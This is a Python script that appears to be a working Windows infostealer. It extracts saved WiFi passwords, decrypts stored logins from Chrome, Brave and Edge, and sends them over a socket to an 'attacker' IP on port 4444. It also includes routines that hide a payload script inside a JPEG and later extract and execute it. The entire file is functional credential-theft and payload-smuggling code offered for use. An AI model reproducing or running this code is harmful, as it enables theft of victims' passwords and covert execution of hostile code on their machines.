import os
import sys
import socket
import subprocess
import json
import base64
import shutil
import sqlite3
import win32crypt                                     
from Crypto.Cipher import AES

# Manually set the attacker's IP (change this to your Kali machine's IP)
ATTACKER_IP = "192.168.0.3"  # <<<< Change this to your attacker's IP
PORT = 4444

# Function to extract WiFi passwords
def extract_wifi_passwords():
    wifi_passwords = []
    try:
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8')
        profiles = [line.split(":")[1].strip() for line in result.split('\n') if "All User Profile" in line]
        for profile in profiles:
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='utf-8')
            key_content = [line.split(":")[1].strip() for line in result.split('\n') if "Key Content" in line]
            if key_content:
                wifi_passwords.append(f"{profile}: {key_content[0]}")
    except Exception as e:
        wifi_passwords.append(f"Error extracting WiFi: {str(e)}")
    return wifi_passwords

# Function to get the encryption key for the specified browser
def get_encryption_key(browser):
    if browser == "Chrome":
        local_state_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Local State"
    elif browser == "Brave":
        local_state_path = os.path.expanduser('~') + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
    elif browser == "Edge":
        local_state_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Local State"
    else:
        raise ValueError("Unsupported browser")

    with open(local_state_path, "r") as file:
        local_state = json.loads(file.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# Function to extract passwords from the specified browser
def extract_browser_passwords(browser):
    if browser == "Chrome":
        login_data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    elif browser == "Brave":
        login_data_path = os.path.expanduser('~') + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    elif browser == "Edge":
        login_data_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
    else:
        raise ValueError("Unsupported browser")

    if not os.path.exists(login_data_path):
        return [f"{browser} Login Data file not found at {login_data_path}"]

    shutil.copy2(login_data_path, "Login Data")  # Make a copy of the database to avoid locking issues
    conn = sqlite3.connect("Login Data")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
    passwords = cursor.fetchall()

    key = get_encryption_key(browser)
    result = []
    for website, action_url, username, password in passwords:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()
        result.append(f"Website: {website}, Username: {username}, Password: {decrypted_password}")

    conn.close()
    os.remove("Login Data")  # Clean up the copied database
    return result

# Function to send data to the attacker's machine
def send_data():
    data = {
        "WiFi Passwords": extract_wifi_passwords(),
        "Chrome Passwords": extract_browser_passwords("Chrome"),
        "Brave Passwords": extract_browser_passwords("Brave"),
        "Edge Passwords": extract_browser_passwords("Edge"),
    }

    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ATTACKER_IP, PORT))  # Connect to the attacker's machine
        client.send(json.dumps(data).encode())  # Send extracted data
        client.close()
        print("[*] Data successfully sent to attacker.")
    except Exception as e:
        print(f"[!] Failed to send data: {e}")  # Debugging message

def embed_script(image_path, script_path, output_path):
    with open(image_path, "rb") as image_file:
        image_data = image_file.read()
    with open(script_path, "rb") as script_file:
        script_data = script_file.read()
    
    with open(output_path, "wb") as output_file:
        output_file.write(image_data + b"EOF" + script_data)

def verify_embedding(image_path):
    with open(image_path, "rb") as image_file:
        data = image_file.read()
        if b"EOF" in data:
            print("EOF marker found. Script embedded successfully.")
        else:
            print("EOF marker not found. Embedding failed.")

def extract_and_execute(image_path):
    with open(image_path, "rb") as image_file:
        data = image_file.read()
    
    if b"EOF" in data:
        image_data, script_data = data.split(b"EOF", 1)
        script_path = "extracted_script.py"
        
        with open(script_path, "wb") as script_file:
            script_file.write(script_data)
        
        print(f"[*] Extracted script to {script_path}")
        
        # Execute the extracted script
        os.system(f"python {script_path}")
    else:
        print("[!] EOF marker not found. No script embedded.")

if __name__ == "__main__":
    if len(sys.argv) == 2 and sys.argv[1] == "embed":
        embed_script("image.jpg", "try_payload.py", "image_with_payload.jpg")
        verify_embedding("image_with_payload.jpg")
    elif len(sys.argv) == 2 and sys.argv[1] == "extract":
        extract_and_execute("image_with_payload.jpg")
    else:
        # Call send_data if no arguments are provided
        send_data()

# root.mainloop()
